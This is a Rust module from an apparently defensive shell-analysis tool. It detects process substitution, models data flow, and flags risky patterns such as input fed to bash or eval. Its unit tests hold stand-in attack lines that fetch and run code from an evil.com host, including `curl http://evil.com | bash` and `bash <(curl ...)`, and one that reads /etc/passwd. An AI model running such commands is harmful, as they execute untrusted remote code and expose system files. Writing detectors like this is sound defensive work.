//! Process substitution detection and data flow modeling for shell scripts.
//!
//! Detects `<(...)` and `>(...)` process substitution patterns and builds a
//! data flow graph showing how commands feed data to each other through
//! process substitution, pipes, and redirects.
//!
//! See spec §16.1 (Shell analysis) and §16.4 (Semantic normalization).

#![forbid(unsafe_code)]

use core::fmt;
use std::collections::BTreeSet;

/// Shell interpreters that execute process substitution content directly.
const INTERPRETER_COMMANDS: &[&str] = &["bash", "sh", "dash", "ash", "zsh", "ksh"];

/// Represents a process substitution found in shell script.
#[derive(Clone, Debug, PartialEq, Eq)]
pub struct ProcessSubstitution {
    /// Whether this is an input `<(...)` or output `>(...)` substitution.
    pub direction: SubstitutionDirection,
    /// The command inside the substitution.
    pub inner_command: String,
    /// The file descriptor target if explicitly specified (e.g., `2>(...)`).
    pub fd_target: Option<String>,
}

/// Direction of a process substitution.
#[derive(Clone, Copy, Debug, PartialEq, Eq)]
pub enum SubstitutionDirection {
    /// `<(...)` — output goes TO the command (read end).
    Input,
    /// `>(...)` — output comes FROM the command (write end).
    Output,
}

impl fmt::Display for SubstitutionDirection {
    fn fmt(&self, formatter: &mut fmt::Formatter<'_>) -> fmt::Result {
        match self {
            Self::Input => formatter.write_str("input"),
            Self::Output => formatter.write_str("output"),
        }
    }
}

/// Directed graph of data flow between commands.
#[derive(Clone, Debug, Default, PartialEq, Eq)]
pub struct DataFlowGraph {
    /// Edges describing data flow between commands.
    pub edges: Vec<DataFlowEdge>,
}

/// A single data flow edge between two commands.
#[derive(Clone, Debug, PartialEq, Eq)]
pub struct DataFlowEdge {
    /// Command or file producing the data.
    pub source: String,
    /// Command or file consuming the data.
    pub target: String,
    /// Mechanism of data transfer.
    pub via: DataFlowMethod,
}

/// Mechanism by which data flows between commands.
#[derive(Clone, Copy, Debug, PartialEq, Eq)]
pub enum DataFlowMethod {
    /// Process substitution `<(...)` or `>(...)`.
    ProcessSubstitution,
    /// Pipe `|`.
    Pipe,
    /// File redirection `>`, `>>`, `<`.
    Redirect,
}

impl fmt::Display for DataFlowMethod {
    fn fmt(&self, formatter: &mut fmt::Formatter<'_>) -> fmt::Result {
        match self {
            Self::ProcessSubstitution => formatter.write_str("process-substitution"),
            Self::Pipe => formatter.write_str("pipe"),
            Self::Redirect => formatter.write_str("redirect"),
        }
    }
}

/// Security risk level for a process substitution pattern.
#[derive(Clone, Copy, Debug, PartialEq, Eq)]
pub enum RiskLevel {
    /// Low risk: process substitution used for legitimate purposes.
    Low,
    /// Medium risk: process substitution in a potentially dangerous context.
    Medium,
    /// High risk: critical pattern like interpreter feed, eval, or nested.
    High,
}

/// Type of risky process substitution pattern detected.
#[derive(Clone, Copy, Debug, PartialEq, Eq, PartialOrd, Ord)]
pub enum RiskPattern {
    /// Substitution fed directly to a shell interpreter (`bash <(...)`, `sh <(...)`).
    InterpreterFeed,
    /// Substitution fed to `eval`.
    EvalFeed,
    /// Nested substitution `<(<(...))`.
    Nested,
    /// Complex pipe chain combining pipes and substitution.
    ComplexPipeChain,
}

/// Security finding describing a risky process substitution pattern.
#[derive(Clone, Debug, PartialEq, Eq)]
pub struct ProcessSubstitutionRisk {
    /// Assessed risk level.
    pub level: RiskLevel,
    /// The specific pattern type detected.
    pub pattern: RiskPattern,
    /// Human-readable description of the risk.
    pub description: String,
}

/// Detects process substitution patterns in a shell script.
///
/// Returns all found substitutions including nested ones. Inner commands are
/// trimmed of surrounding whitespace. Scans source-level text and respects
/// quote boundaries to avoid false positives from quoted `<(`
/// sequences.
#[must_use]
pub fn find_process_substitutions(source: &str) -> Vec<ProcessSubstitution> {
    let bytes = source.as_bytes();
    let mut results = Vec::new();
    let mut index = 0;
    while index < bytes.len() {
        if matches!(bytes[index], b'\'' | b'"') {
            index = skip_quoted(source, index);
            continue;
        }
        if let Some(direction) = substitution_marker_at(bytes, index) {
            let inner_start = index.saturating_add(2);
            if let Some(inner_end) = find_matching_paren(source, inner_start) {
                let inner_command = source
                    .get(inner_start..inner_end)
                    .unwrap_or_default()
                    .trim()
                    .to_owned();
                results.push(ProcessSubstitution {
                    direction,
                    inner_command,
                    fd_target: None,
                });
            }
        }
        index = index.saturating_add(1);
    }
    results
}

/// Builds a data flow graph from a shell script.
///
/// Captures edges from process substitutions, pipes, and output redirects.
/// Command names are the first token of each command. For process
/// substitutions, edges follow data direction: `<(...)` flows inner→consumer,
/// `>(...)` flows consumer→inner.
#[must_use]
pub fn analyze_data_flow(source: &str) -> DataFlowGraph {
    let mut edges = Vec::new();
    for statement in split_statements(source) {
        add_process_substitution_edges(&statement, &mut edges);
        add_pipe_edges(&statement, &mut edges);
        add_redirect_edges(&statement, &mut edges);
    }
    DataFlowGraph { edges }
}

/// Assesses process substitution patterns for security risk.
///
/// Detects and returns findings for:
/// - `bash <(...)` or `sh <(...)` — substitution fed to interpreter (high)
/// - `eval <(...)` — substitution fed to eval (high)
/// - `curl ... | bash <(...)` — complex pipe chains (high)
/// - `<(<(...))` — nested substitutions (high)
#[must_use]
pub fn assess_risk(source: &str) -> Vec<ProcessSubstitutionRisk> {
    let mut findings = Vec::new();

    if has_nested_substitution(source) {
        findings.push(ProcessSubstitutionRisk {
            level: RiskLevel::High,
            pattern: RiskPattern::Nested,
            description: "Nested process substitution <(<(...)) detected".to_owned(),
        });
    }

    let mut seen_patterns = BTreeSet::new();
    for statement in split_statements(source) {
        if !(statement.contains("<(") || statement.contains(">(")) {
            continue;
        }

        let has_pipe = statement.contains('|');
        for token in statement.split_whitespace() {
            let clean = token.trim_matches(|c| matches!(c, '\'' | '"' | '(' | ')'));
            if INTERPRETER_COMMANDS.contains(&clean)
                && seen_patterns.insert(RiskPattern::InterpreterFeed)
            {
                findings.push(ProcessSubstitutionRisk {
                    level: RiskLevel::High,
                    pattern: RiskPattern::InterpreterFeed,
                    description: format!("Process substitution fed to interpreter '{clean}'"),
                });
            }
            if clean == "eval" && seen_patterns.insert(RiskPattern::EvalFeed) {
                findings.push(ProcessSubstitutionRisk {
                    level: RiskLevel::High,
                    pattern: RiskPattern::EvalFeed,
                    description: "Process substitution fed to eval".to_owned(),
                });
            }
        }

        if has_pipe && seen_patterns.insert(RiskPattern::ComplexPipeChain) {
            findings.push(ProcessSubstitutionRisk {
                level: RiskLevel::High,
                pattern: RiskPattern::ComplexPipeChain,
                description: "Complex pipe chain with process substitution".to_owned(),
            });
        }
    }

    findings
}

fn has_nested_substitution(source: &str) -> bool {
    find_process_substitutions(source)
        .iter()
        .any(|sub| !find_process_substitutions(&sub.inner_command).is_empty())
}

fn add_process_substitution_edges(statement: &str, edges: &mut Vec<DataFlowEdge>) {
    let Some(consumer) = first_command_token(statement) else {
        return;
    };
    for sub in find_process_substitutions(statement) {
        let Some(inner_cmd) = first_command_token(&sub.inner_command) else {
            continue;
        };
        let (source, target) = match sub.direction {
            SubstitutionDirection::Input => (inner_cmd, consumer.clone()),
            SubstitutionDirection::Output => (consumer.clone(), inner_cmd),
        };
        edges.push(DataFlowEdge {
            source,
            target,
            via: DataFlowMethod::ProcessSubstitution,
        });
    }
}

fn add_pipe_edges(statement: &str, edges: &mut Vec<DataFlowEdge>) {
    let stages = split_on_pipes(statement);
    for pair in stages.windows(2) {
        let [left, right] = pair else {
            continue;
        };
        let Some(source) = first_command_token(left) else {
            continue;
        };
        let Some(target) = first_command_token(right) else {
            continue;
        };
        edges.push(DataFlowEdge {
            source,
            target,
            via: DataFlowMethod::Pipe,
        });
    }
}

fn add_redirect_edges(statement: &str, edges: &mut Vec<DataFlowEdge>) {
    let Some(consumer) = first_command_token(statement) else {
        return;
    };
    let bytes = statement.as_bytes();
    let mut index = 0;
    while index < bytes.len() {
        match bytes[index] {
            b'\'' | b'"' => {
                index = skip_quoted(statement, index);
                continue;
            }
            b'(' => {
                index = find_matching_paren(statement, index.saturating_add(1))
                    .map_or(bytes.len(), |close| close.saturating_add(1));
                continue;
            }
            b'>' if bytes.get(index.saturating_add(1)) != Some(&b'(') => {
                let mut after = index.saturating_add(1);
                if bytes.get(after) == Some(&b'>') {
                    after = after.saturating_add(1);
                }
                if let Some(file) = statement[after..].split_whitespace().next() {
                    let clean = file.trim_matches(|c| matches!(c, '\'' | '"' | '|'));
                    if !clean.is_empty() {
                        edges.push(DataFlowEdge {
                            source: consumer.clone(),
                            target: clean.to_owned(),
                            via: DataFlowMethod::Redirect,
                        });
                    }
                }
            }
            _ => {}
        }
        index = index.saturating_add(1);
    }
}

fn substitution_marker_at(bytes: &[u8], index: usize) -> Option<SubstitutionDirection> {
    let byte = *bytes.get(index)?;
    let next = *bytes.get(index.saturating_add(1))?;
    match (byte, next) {
        (b'<', b'(') => {
            // Exclude `<<(heredoc)` and `<<<(herestring)`: a preceding `<`
            // means this is not a process substitution.
            if index > 0 && bytes.get(index - 1).is_some_and(|prev| *prev == b'<') {
                return None;
            }
            Some(SubstitutionDirection::Input)
        }
        (b'>', b'(') => Some(SubstitutionDirection::Output),
        _ => None,
    }
}

fn find_matching_paren(source: &str, start: usize) -> Option<usize> {
    let bytes = source.as_bytes();
    let mut depth = 1_usize;
    let mut index = start;
    while index < bytes.len() && depth > 0 {
        match bytes[index] {
            b'(' => depth = depth.saturating_add(1),
            b')' => {
                depth = depth.saturating_sub(1);
                if depth == 0 {
                    return Some(index);
                }
            }
            b'\'' | b'"' => {
                index = skip_quoted(source, index);
                continue;
            }
            _ => {}
        }
        index = index.saturating_add(1);
    }
    None
}

fn skip_quoted(source: &str, start: usize) -> usize {
    let bytes = source.as_bytes();
    let Some(&quote) = bytes.get(start) else {
        return start.saturating_add(1);
    };
    if !matches!(quote, b'\'' | b'"') {
        return start.saturating_add(1);
    }
    let mut index = start.saturating_add(1);
    while index < bytes.len() && bytes[index] != quote {
        index = index.saturating_add(1);
    }
    index.saturating_add(1)
}

fn first_command_token(statement: &str) -> Option<String> {
    let token = statement.split_whitespace().next()?;
    let clean = token.trim_matches(|c| matches!(c, '\'' | '"' | '(' | ')'));
    (!clean.is_empty()).then_some(clean.to_owned())
}

fn split_statements(source: &str) -> Vec<String> {
    let bytes = source.as_bytes();
    let mut statements = Vec::new();
    let mut start = 0;
    let mut index = 0;
    while index < bytes.len() {
        let split_here = match bytes[index] {
            b';' | b'\n' => true,
            b'&' | b'|' if bytes.get(index.saturating_add(1)) == Some(&bytes[index]) => true,
            b'(' => {
                index = find_matching_paren(source, index.saturating_add(1))
                    .map_or(bytes.len(), |close| close.saturating_add(1));
                continue;
            }
            b'\'' | b'"' => {
                index = skip_quoted(source, index);
                continue;
            }
            _ => false,
        };
        if split_here {
            push_trimmed(&mut statements, source, start, index);
            start = if matches!(bytes[index], b';' | b'\n') {
                index.saturating_add(1)
            } else {
                index.saturating_add(2)
            };
        }
        index = index.saturating_add(1);
    }
    push_trimmed(&mut statements, source, start, bytes.len());
    statements
}

fn split_on_pipes(statement: &str) -> Vec<String> {
    let bytes = statement.as_bytes();
    let mut parts = Vec::new();
    let mut start = 0;
    let mut index = 0;
    while index < bytes.len() {
        let split_here = match bytes[index] {
            b'|' if bytes.get(index.saturating_add(1)) != Some(&b'|') => true,
            b'(' => {
                index = find_matching_paren(statement, index.saturating_add(1))
                    .map_or(bytes.len(), |close| close.saturating_add(1));
                continue;
            }
            b'\'' | b'"' => {
                index = skip_quoted(statement, index);
                continue;
            }
            _ => false,
        };
        if split_here {
            push_trimmed(&mut parts, statement, start, index);
            start = index.saturating_add(1);
        }
        index = index.saturating_add(1);
    }
    push_trimmed(&mut parts, statement, start, bytes.len());
    parts
}

fn push_trimmed(parts: &mut Vec<String>, source: &str, start: usize, end: usize) {
    let part = source[start..end.min(source.len())].trim();
    if !part.is_empty() {
        parts.push(part.to_owned());
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn finds_input_substitution() {
        let source = "diff <(sort a.txt) b.txt";
        let subs = find_process_substitutions(source);
        assert_eq!(subs.len(), 1);
        assert_eq!(subs[0].direction, SubstitutionDirection::Input);
        assert_eq!(subs[0].inner_command, "sort a.txt");
    }

    #[test]
    fn finds_output_substitution() {
        let source = "tee >(gzip > file.gz)";
        let subs = find_process_substitutions(source);
        assert_eq!(subs.len(), 1);
        assert_eq!(subs[0].direction, SubstitutionDirection::Output);
        assert_eq!(subs[0].inner_command, "gzip > file.gz");
    }

    #[test]
    fn finds_multiple_substitutions() {
        let source = "diff <(curl http://evil.com) <(cat /etc/passwd)";
        let subs = find_process_substitutions(source);
        assert_eq!(subs.len(), 2);
        assert!(
            subs.iter()
                .all(|s| s.direction == SubstitutionDirection::Input)
        );
        assert_eq!(subs[0].inner_command, "curl http://evil.com");
        assert_eq!(subs[1].inner_command, "cat /etc/passwd");
    }

    #[test]
    fn extracts_inner_command() {
        let source = "cmd <(echo hello world)";
        let subs = find_process_substitutions(source);
        assert_eq!(subs.len(), 1);
        assert_eq!(subs[0].inner_command, "echo hello world");
    }

    #[test]
    fn nested_substitution_detected() {
        let source = "cmd <(<(curl http://evil.com))";
        let subs = find_process_substitutions(source);
        assert_eq!(subs.len(), 2);
        assert_eq!(subs[0].inner_command, "<(curl http://evil.com)");
        assert_eq!(subs[1].inner_command, "curl http://evil.com");
    }

    #[test]
    fn data_flow_graph_builds_edges() {
        let source = "diff <(curl http://evil.com) <(cat /etc/passwd)";
        let graph = analyze_data_flow(source);
        assert_eq!(graph.edges.len(), 2);
        assert!(graph.edges.iter().any(|e| e.source == "curl"
            && e.target == "diff"
            && e.via == DataFlowMethod::ProcessSubstitution));
        assert!(graph.edges.iter().any(|e| e.source == "cat"
            && e.target == "diff"
            && e.via == DataFlowMethod::ProcessSubstitution));
    }

    #[test]
    fn data_flow_graph_output_direction() {
        let source = "tee >(gzip > file.gz) >(wc -l)";
        let graph = analyze_data_flow(source);
        assert_eq!(graph.edges.len(), 2);
        assert!(graph.edges.iter().any(|e| e.source == "tee"
            && e.target == "gzip"
            && e.via == DataFlowMethod::ProcessSubstitution));
        assert!(graph.edges.iter().any(|e| e.source == "tee"
            && e.target == "wc"
            && e.via == DataFlowMethod::ProcessSubstitution));
    }

    #[test]
    fn data_flow_graph_pipe_edges() {
        let source = "curl http://evil.com | bash";
        let graph = analyze_data_flow(source);
        assert!(
            graph
                .edges
                .iter()
                .any(|e| e.source == "curl" && e.target == "bash" && e.via == DataFlowMethod::Pipe)
        );
    }

    #[test]
    fn bash_substitution_flagged_as_critical() {
        let source = "bash <(curl http://evil.com/install.sh)";
        let risks = assess_risk(source);
        assert!(
            risks
                .iter()
                .any(|r| r.pattern == RiskPattern::InterpreterFeed && r.level == RiskLevel::High)
        );
    }

    #[test]
    fn eval_substitution_flagged() {
        let source = "eval <(curl http://evil.com)";
        let risks = assess_risk(source);
        assert!(
            risks
                .iter()
                .any(|r| r.pattern == RiskPattern::EvalFeed && r.level == RiskLevel::High)
        );
    }

    #[test]
    fn nested_substitution_flagged() {
        let source = "cmd <(<(echo nested))";
        let risks = assess_risk(source);
        assert!(
            risks
                .iter()
                .any(|r| r.pattern == RiskPattern::Nested && r.level == RiskLevel::High)
        );
    }

    #[test]
    fn complex_pipe_chain_flagged() {
        let source = "curl http://evil.com | bash <(cat config)";
        let risks = assess_risk(source);
        assert!(
            risks
                .iter()
                .any(|r| r.pattern == RiskPattern::ComplexPipeChain && r.level == RiskLevel::High)
        );
    }

    #[test]
    fn ignores_quoted_substitution_markers() {
        let source = "echo 'this is <(not a substitution)'";
        let subs = find_process_substitutions(source);
        assert!(subs.is_empty());
    }

    #[test]
    fn ignores_heredoc_markers() {
        let source = "cat <<(not_procsub)";
        let subs = find_process_substitutions(source);
        assert!(subs.is_empty());
    }
}
